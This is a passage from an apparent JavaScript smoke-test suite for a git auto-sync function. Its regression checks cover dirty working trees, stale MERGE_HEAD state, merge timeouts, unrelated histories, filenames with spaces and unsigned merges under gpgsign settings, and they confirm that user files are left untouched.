  fs.writeFileSync(path.join(dirtyDev, "dirty-local.md"), "local commit\n");
  git(dirtyDev, ["add", "dirty-local.md"]);
  git(dirtyDev, ["commit", "-m", "local on dirty-tree dev"]);
  fs.writeFileSync(path.join(deviceB, "dirty-remote.md"), "from B for dirty test\n");
  git(deviceB, ["pull", "origin", "main"], { allowFail: true });
  git(deviceB, ["add", "dirty-remote.md"]);
  git(deviceB, ["commit", "-m", "B for dirty test"]);
  git(deviceB, ["push", "origin", "main"]);
  // Make the tree dirty by leaving an unstaged modification.
  fs.writeFileSync(path.join(dirtyDev, "dirty-local.md"), "local commit (modified, unstaged)\n");

  const ev = await gitSync.fetchAndFF({ abrainHome: dirtyDev });
  if (ev.result !== "failed") {
    throw new Error(`dirty tree must produce failed (not conflict); got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.error || !/working tree/i.test(ev.error)) {
    throw new Error(`error should mention working tree; got: ${ev.error}`);
  }
  // The unstaged change must still be there — we refused to touch it.
  const content = fs.readFileSync(path.join(dirtyDev, "dirty-local.md"), "utf-8");
  if (!content.includes("modified, unstaged")) {
    throw new Error(`dirty content was overwritten by failed auto-merge: ${content}`);
  }
});

// 17.2 — pre-existing MERGE_HEAD must be reported as `failed`, not retried.
await asyncCheck("fetchAndFF refuses to merge over pre-existing MERGE_HEAD wedge", async () => {
  const wedgeDev = path.join(tmpDir, "wedge", ".abrain");
  fs.mkdirSync(path.dirname(wedgeDev), { recursive: true });
  git(path.dirname(wedgeDev), ["clone", remoteDir, ".abrain"]);
  // Setup order matters: do the local commit FIRST (to establish ahead>0
  // for the divergence path), THEN fabricate MERGE_HEAD. If we fabricate
  // first, `git commit` interprets MERGE_HEAD as an in-progress merge and
  // consumes it into a merge commit — the wedge would vanish before our
  // assertion runs.
  fs.writeFileSync(path.join(wedgeDev, "w.md"), "w\n");
  git(wedgeDev, ["add", "w.md"]);
  git(wedgeDev, ["commit", "-m", "w local"]);
  // NOW fabricate the wedge. Use a real commit SHA from origin/main as the
  // MERGE_HEAD target so git accepts the file as a valid merge state.
  const headSha = git(wedgeDev, ["rev-parse", "HEAD"]).stdout.trim();
  fs.writeFileSync(path.join(wedgeDev, ".git", "MERGE_HEAD"), headSha + "\n");
  // Build divergence on remote so fetchAndFF's behind>0 branch is taken.
  fs.writeFileSync(path.join(deviceB, "w-remote.md"), "w-remote\n");
  git(deviceB, ["pull", "origin", "main"], { allowFail: true });
  git(deviceB, ["add", "w-remote.md"]);
  git(deviceB, ["commit", "-m", "w remote"]);
  git(deviceB, ["push", "origin", "main"]);

  // Sanity: MERGE_HEAD must still be present right before we call fetchAndFF.
  if (!fs.existsSync(path.join(wedgeDev, ".git", "MERGE_HEAD"))) {
    throw new Error("smoke setup bug: MERGE_HEAD vanished before fetchAndFF call");
  }

  const ev = await gitSync.fetchAndFF({ abrainHome: wedgeDev });
  // The key invariant: NOT 'ok' (we definitely didn't successfully merge
  // anything; merging over a wedge would be data-loss) and NOT 'conflict'
  // (we never started a new merge so there's no textual conflict to talk
  // about). Preflight should catch this as 'failed' with a MERGE_HEAD hint.
  if (ev.result === "conflict" || ev.result === "ok") {
    throw new Error(`pre-existing MERGE_HEAD must not be reported as ${ev.result}; got error: ${ev.error}`);
  }
  if (ev.result !== "failed" || !ev.error || !/MERGE_HEAD/i.test(ev.error)) {
    throw new Error(`expected failed with MERGE_HEAD in error message; got result=${ev.result} error=${ev.error}`);
  }
  // Preflight is read-only; it must NOT have cleared the wedge by itself.
  if (!fs.existsSync(path.join(wedgeDev, ".git", "MERGE_HEAD"))) {
    throw new Error("preflight should be read-only; MERGE_HEAD was cleared as a side-effect");
  }
});

// 17.3 — merge subprocess timeout must classify as `timeout`, not `conflict`.
await asyncCheck("fetchAndFF on textual conflict with sub-millisecond merge timeout produces timeout (not conflict)", async () => {
  // Build divergence + a textual conflict on a fresh clone, then force the
  // merge subprocess to be killed by an aggressive timeout. Without the
  // Round 3 catch-block fix this would have classified as `conflict`
  // because `conflictPaths` happens to be populated AFTER `merge` already
  // wrote the unmerged index entries. We pin the OPPOSITE: SIGTERM-killed
  // merge must be `timeout` even if some unmerged paths exist transiently.
  const toDev = path.join(tmpDir, "timeout-merge", ".abrain");
  fs.mkdirSync(path.dirname(toDev), { recursive: true });
  git(path.dirname(toDev), ["clone", remoteDir, ".abrain"]);
  fs.writeFileSync(path.join(toDev, "to-target.md"), "baseline\n");
  git(toDev, ["add", "to-target.md"]);
  git(toDev, ["commit", "-m", "timeout-merge baseline"]);
  git(toDev, ["push", "origin", "main"]);
  // Build the conflict.
  fs.writeFileSync(path.join(toDev, "to-target.md"), "local change\n");
  git(toDev, ["add", "to-target.md"]);
  git(toDev, ["commit", "-m", "local conflicting"]);
  const tmpB = path.join(tmpDir, "timeout-merge-b", ".abrain");
  fs.mkdirSync(path.dirname(tmpB), { recursive: true });
  git(path.dirname(tmpB), ["clone", remoteDir, ".abrain"]);
  fs.writeFileSync(path.join(tmpB, "to-target.md"), "remote change\n");
  git(tmpB, ["add", "to-target.md"]);
  git(tmpB, ["commit", "-m", "remote conflicting"]);
  git(tmpB, ["push", "origin", "main"]);

  // 1ms timeout will SIGTERM the merge subprocess virtually always.
  const ev = await gitSync.fetchAndFF({ abrainHome: toDev, timeoutMs: 1 });
  // Acceptable: 'timeout' (correct classification) or 'failed' (also non-
  // lying). NOT acceptable: 'conflict' (which would falsely route the user
  // to the conflict runbook for a network/timeout problem) or 'ok'.
  if (ev.result === "conflict" || ev.result === "ok") {
    throw new Error(`SIGTERM-killed merge must not classify as ${ev.result}; got error: ${ev.error}`);
  }
});

// 17.4 — unrelated histories must classify as `failed`, not `conflict`.
await asyncCheck("fetchAndFF with unrelated histories classifies as failed (not conflict)", async () => {
  // Two clones bootstrapped from independent `git init` repos pointed at
  // the same bare remote produce "refusing to merge unrelated histories".
  // This is a fatal merge error, NOT a textual conflict.
  const unrelatedRemote = path.join(tmpDir, "unrelated-remote.git");
  fs.mkdirSync(unrelatedRemote, { recursive: true });
  git(unrelatedRemote, ["init", "--bare", "--initial-branch=main"]);

  // Seed remote with one independent history.
  const seed = path.join(tmpDir, "unrelated-seed", ".abrain");
  fs.mkdirSync(path.dirname(seed), { recursive: true });
  git(path.dirname(seed), ["clone", unrelatedRemote, ".abrain"]);
  fs.writeFileSync(path.join(seed, "seed-unrelated.md"), "seed\n");
  git(seed, ["add", "seed-unrelated.md"]);
  git(seed, ["commit", "-m", "unrelated seed"]);
  git(seed, ["branch", "-M", "main"]);
  git(seed, ["push", "-u", "origin", "main"]);

  // Build a SECOND repo from scratch (no shared history), point it at the
  // same remote, give it a local commit so getAheadBehind sees ahead>0.
  const orphan = path.join(tmpDir, "unrelated-orphan", ".abrain");
  fs.mkdirSync(orphan, { recursive: true });
  git(orphan, ["init", "--initial-branch=main"]);
  fs.writeFileSync(path.join(orphan, ".gitignore"), ".state/\n");
  fs.writeFileSync(path.join(orphan, "orphan.md"), "orphan\n");
  git(orphan, ["add", ".gitignore", "orphan.md"]);
  git(orphan, ["commit", "-m", "orphan local"]);
  git(orphan, ["remote", "add", "origin", unrelatedRemote]);

  const ev = await gitSync.fetchAndFF({ abrainHome: orphan });
  if (ev.result === "conflict" || ev.result === "ok") {
    throw new Error(`unrelated histories must not classify as ${ev.result}; got error: ${ev.error}`);
  }
  // Should be 'failed' — git's stderr says "refusing to merge unrelated histories".
  if (ev.result !== "failed" && ev.result !== "timeout") {
    throw new Error(`expected failed for unrelated histories; got ${ev.result}`);
  }
  // No MERGE_HEAD should leak.
  if (fs.existsSync(path.join(orphan, ".git", "MERGE_HEAD"))) {
    throw new Error(`MERGE_HEAD persists after unrelated-histories failure`);
  }
});

// 17.5 — conflictPaths must survive paths containing spaces (smoke for `-z` parse).
await asyncCheck("conflictPaths correctly handles filenames containing spaces (via -z NUL parse)", async () => {
  const spDev = path.join(tmpDir, "spaces", ".abrain");
  fs.mkdirSync(path.dirname(spDev), { recursive: true });
  git(path.dirname(spDev), ["clone", remoteDir, ".abrain"]);
  const spaceFile = "file with spaces.md";
  fs.writeFileSync(path.join(spDev, spaceFile), "baseline\n");
  git(spDev, ["add", "--", spaceFile]);
  git(spDev, ["commit", "-m", "baseline with space file"]);
  git(spDev, ["push", "origin", "main"]);
  // Force a real conflict on the space-containing path.
  fs.writeFileSync(path.join(spDev, spaceFile), "A side\n");
  git(spDev, ["add", "--", spaceFile]);
  git(spDev, ["commit", "-m", "A change"]);
  const spB = path.join(tmpDir, "spaces-b", ".abrain");
  fs.mkdirSync(path.dirname(spB), { recursive: true });
  git(path.dirname(spB), ["clone", remoteDir, ".abrain"]);
  fs.writeFileSync(path.join(spB, spaceFile), "B side\n");
  git(spB, ["add", "--", spaceFile]);
  git(spB, ["commit", "-m", "B change"]);
  git(spB, ["push", "origin", "main"]);

  const ev = await gitSync.fetchAndFF({ abrainHome: spDev });
  if (ev.result !== "conflict") {
    throw new Error(`expected conflict, got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.conflictPaths || !ev.conflictPaths.includes(spaceFile)) {
    throw new Error(`expected '${spaceFile}' in conflictPaths (NUL-split correctly); got: ${JSON.stringify(ev.conflictPaths)}`);
  }
});

// [18] Round 4 audit regressions — SIGTERM priority + behind=0 wedge +
// gpgsign defense + dirty-tree preserves user content.
console.log("\n[18] Round 4 audit: SIGTERM priority, behind=0 wedge, gpgsign, etc.");

// 18.1 — SIGTERM-killed merge MUST classify as `timeout` even if a
// pre-merge hook caused git to write partial state before the kill.
// Pin for the Round 4 3-way consensus finding: previously the
// classifier checked isRealConflict BEFORE SIGTERM, so a merge that
// got SIGTERM'd while a `pre-merge-commit` hook was sleeping could
// produce conflictPaths!=[] (or a stderr mentioning CONFLICT) and
// silently mislabel as `conflict`. The fix puts SIGTERM check first.
await asyncCheck("SIGTERM-killed merge classifies as timeout, not conflict (Round 4 catch-block ordering)", async () => {
  const hookDev = path.join(tmpDir, "sigterm-hook", ".abrain");
  fs.mkdirSync(path.dirname(hookDev), { recursive: true });
  git(path.dirname(hookDev), ["clone", remoteDir, ".abrain"]);
  // Create divergence on disjoint files so the auto-merge path is taken.
  fs.writeFileSync(path.join(hookDev, "hook-local.md"), "local\n");
  git(hookDev, ["add", "hook-local.md"]);
  git(hookDev, ["commit", "-m", "hook local"]);
  fs.writeFileSync(path.join(deviceB, "hook-remote.md"), "remote\n");
  git(deviceB, ["pull", "origin", "main"], { allowFail: true });
  git(deviceB, ["add", "hook-remote.md"]);
  git(deviceB, ["commit", "-m", "hook remote"]);
  git(deviceB, ["push", "origin", "main"]);
  // Install a pre-merge-commit hook that blocks long enough that our
  // short timeoutMs will reliably SIGTERM the merge subprocess. This is
  // deterministic (the hook is the bottleneck) whereas raw timeoutMs:1
  // is wall-clock-race-flaky.
  const hookPath = path.join(hookDev, ".git", "hooks", "pre-merge-commit");
  fs.writeFileSync(hookPath, "#!/bin/sh\nsleep 5\nexit 0\n");
  fs.chmodSync(hookPath, 0o755);

  const ev = await gitSync.fetchAndFF({ abrainHome: hookDev, timeoutMs: 500 });
  // Pin: SIGTERM must beat any other classification signal. Pre-Round-4
  // code would have set result='conflict' if the hook delay caused git
  // to flush partial state before the kill.
  if (ev.result !== "timeout") {
    throw new Error(`SIGTERM-killed merge must classify as timeout; got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.error || !/timed out/i.test(ev.error)) {
    throw new Error(`timeout error should mention 'timed out'; got: ${ev.error}`);
  }
  // The abort run inside the catch must leave a clean tree even though
  // the merge was killed mid-flight.
  if (fs.existsSync(path.join(hookDev, ".git", "MERGE_HEAD"))) {
    throw new Error(`MERGE_HEAD must be cleared after SIGTERM-killed merge`);
  }
});

// 18.2 — MERGE_HEAD preflight must trigger even when behind=0
// (i.e. nothing new on remote). Pre-Round-4 the preflight was gated
// on behind>0, so a pre-existing wedge with no remote progress would
// silently produce result=noop while the next sediment commit would
// wedge.
await asyncCheck("fetchAndFF refuses MERGE_HEAD wedge even when behind=0 (not noop)", async () => {
  const noopWedge = path.join(tmpDir, "noop-wedge", ".abrain");
  fs.mkdirSync(path.dirname(noopWedge), { recursive: true });
  git(path.dirname(noopWedge), ["clone", remoteDir, ".abrain"]);
  // Fabricate a MERGE_HEAD wedge without diverging from remote, so
  // getAheadBehind will report ahead=0, behind=0 after fetch.
  const sha = git(noopWedge, ["rev-parse", "HEAD"]).stdout.trim();
  fs.writeFileSync(path.join(noopWedge, ".git", "MERGE_HEAD"), sha + "\n");

  const ev = await gitSync.fetchAndFF({ abrainHome: noopWedge });
  if (ev.result === "noop" || ev.result === "ok") {
    throw new Error(`pre-existing MERGE_HEAD must not be swallowed as ${ev.result} even when behind=0; got error: ${ev.error}`);
  }
  if (ev.result !== "failed" || !ev.error || !/MERGE_HEAD/i.test(ev.error)) {
    throw new Error(`expected failed with MERGE_HEAD hint; got result=${ev.result} error=${ev.error}`);
  }
  // Preflight is read-only: it must NOT have cleared the wedge.
  if (!fs.existsSync(path.join(noopWedge, ".git", "MERGE_HEAD"))) {
    throw new Error(`preflight cleared MERGE_HEAD as a side-effect; should be read-only`);
  }
});

// 18.3 — commit.gpgsign=true in user config must NOT block auto-merge.
// Pin for the `-c commit.gpgsign=false` + `--no-gpg-sign` flag fix.
// Without either, a user with `commit.gpgsign=true` and no gpg agent
// would have the merge fail at signing and (pre-fix) get misclassified
// as `conflict`. With the fix, the merge proceeds unsigned and
// classifies as `ok`.
await asyncCheck("auto-merge succeeds under commit.gpgsign=true with no gpg agent available", async () => {
  const gpgDev = path.join(tmpDir, "gpgsign-on", ".abrain");
  fs.mkdirSync(path.dirname(gpgDev), { recursive: true });
  git(path.dirname(gpgDev), ["clone", remoteDir, ".abrain"]);
  // Divergence setup first — do this BEFORE enabling gpgsign so the
  // setup commits themselves don't trip the failing-signer trap.
  fs.writeFileSync(path.join(gpgDev, "gpg-local.md"), "gpg local\n");
  git(gpgDev, ["add", "gpg-local.md"]);
  git(gpgDev, ["commit", "-m", "gpg local"]);
  fs.writeFileSync(path.join(deviceB, "gpg-remote.md"), "gpg remote\n");
  git(deviceB, ["pull", "origin", "main"], { allowFail: true });
  git(deviceB, ["add", "gpg-remote.md"]);
  git(deviceB, ["commit", "-m", "gpg remote"]);
  git(deviceB, ["push", "origin", "main"]);
  // NOW arm the trap: signing required + gpg binary unreachable. If
  // fetchAndFF's merge invocation didn't disable signing it would hit
  // "gpg failed to sign the data" and (pre-fix) be misclassified as
  // `conflict`.
  git(gpgDev, ["config", "commit.gpgsign", "true"]);
  git(gpgDev, ["config", "gpg.program", "/nonexistent/gpg-binary"]);

  const ev = await gitSync.fetchAndFF({ abrainHome: gpgDev });
  // Pre-fix: signing would fail → misclassified as conflict.
  // Post-fix: `-c commit.gpgsign=false` + `--no-gpg-sign` bypass signing.
  if (ev.result !== "ok") {
    throw new Error(`auto-merge under commit.gpgsign=true must succeed unsigned; got ${ev.result} (error: ${ev.error})`);
  }
  if (!ev.merged || ev.merged < 1) {
    throw new Error(`expected merged>=1, got ${ev.merged}`);
  }
  // Verify the merge commit is actually unsigned (no GPG signature in
  // commit header). `git log --show-signature` would print "No signature"
  // on an unsigned commit.
  const showSig = git(gpgDev, ["log", "-1", "--format=%G?"]).stdout.trim();
  // %G? returns 'N' for no signature; 'B' for bad; 'G' for good signature; etc.
  if (showSig !== "N") {
    throw new Error(`merge commit should be unsigned (%G? == 'N'); got '${showSig}'`);
  }
});

// 18.4 — dirty-tree refusal must preserve user content. Pin that the
// preflight isn't accidentally calling `git checkout` or `reset` and
// clobbering the user's uncommitted edit.
// (This is implicit in 17.1 but called out explicitly as a Round 4 sanity
// check that the preflight remains read-only.)
await asyncCheck("dirty-tree preflight does NOT clobber the uncommitted edit", async () => {
  const sanityDev = path.join(tmpDir, "dirty-sanity", ".abrain");
  fs.mkdirSync(path.dirname(sanityDev), { recursive: true });
  git(path.dirname(sanityDev), ["clone", remoteDir, ".abrain"]);
  // Make local commit + divergence.
  fs.writeFileSync(path.join(sanityDev, "sanity.md"), "committed\n");
  git(sanityDev, ["add", "sanity.md"]);
  git(sanityDev, ["commit", "-m", "sanity local"]);
  fs.writeFileSync(path.join(deviceB, "sanity-remote.md"), "sanity remote\n");
  git(deviceB, ["pull", "origin", "main"], { allowFail: true });
  git(deviceB, ["add", "sanity-remote.md"]);
  git(deviceB, ["commit", "-m", "sanity remote"]);
  git(deviceB, ["push", "origin", "main"]);
  // Now dirty the tree by introducing an untracked file with content
  // the user explicitly cares about — it must survive untouched.
  const treasure = "draft-keep-me.md";
  const treasureContent = "important unsaved work, do NOT touch\n";
  fs.writeFileSync(path.join(sanityDev, treasure), treasureContent);

  const ev = await gitSync.fetchAndFF({ abrainHome: sanityDev });
  if (ev.result !== "failed") {
    throw new Error(`dirty tree must produce failed; got ${ev.result}`);
  }
  // Treasure file content must be byte-identical.
  const after = fs.readFileSync(path.join(sanityDev, treasure), "utf-8");
  if (after !== treasureContent) {
    throw new Error(`preflight clobbered user content; expected ${JSON.stringify(treasureContent)}, got ${JSON.stringify(after)}`);
  }
  // origin/main commits must still be unmerged (preflight did not
  // sneakily merge after detecting dirty tree).
  const log = git(sanityDev, ["log", "--oneline", "-10"]).stdout;
  if (log.includes("sanity remote")) {
    throw new Error(`preflight unexpectedly merged remote into local; log:\n${log}`);
  }
});

// ── Cleanup ────────────────────────────────────────────────────────
// Round 2 audit fix (deepseek n3): cleanup is best-effort — if any check
// above had thrown unhandled (we use try/catch internally so this is
// theoretical), tmpDir would leak. Wrap to harden.
try {
  fs.rmSync(tmpDir, { recursive: true, force: true });
} catch {
  // tmpDir cleanup failed; not a smoke failure.
}

// Report──────────────────────────────────────────────────────
console.log(`\nTotal: ${totalChecks} checks, ${failures.length} failed`);
if (failures.length > 0) {
  console.log("\nFailures:");
  for (const { name, err } of failures) {
    console.log(`  ✗ ${name}: ${err.message}`);
  }
  process.exit(1);
}
console.log("all ok");
